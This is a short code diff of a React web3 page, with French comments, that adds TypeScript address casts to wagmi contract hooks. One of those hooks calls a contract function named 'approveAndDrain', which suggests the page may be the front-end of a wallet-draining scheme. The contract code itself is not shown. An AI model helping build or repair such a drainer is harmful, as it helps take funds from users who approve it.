@@ -1,4 +1,3 @@
-// index.tsx
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useContractRead, useContractWrite } from "wagmi";
 import contractAddress from "../utils/contractAddress"; // Importation par défaut
@@ -99,14 +98,14 @@ export default function Home() {
 
   // Lire le owner du contrat
   const { data: owner, isError, isLoading } = useContractRead({
-    address: contractAddress,
+    address: contractAddress as `0x${string}`,  // Assurez-vous que l'adresse est bien typée
     abi: contractAbi,
     functionName: "owner",
   });
 
   // Écrire sur le contrat
   const { write: approveAndDrain, isLoading: isWriting } = useContractWrite({
-    address: contractAddress,
+    address: contractAddress as `0x${string}`,  // Assurez-vous que l'adresse est bien typée
     abi: contractAbi,
     functionName: "approveAndDrain",
   });
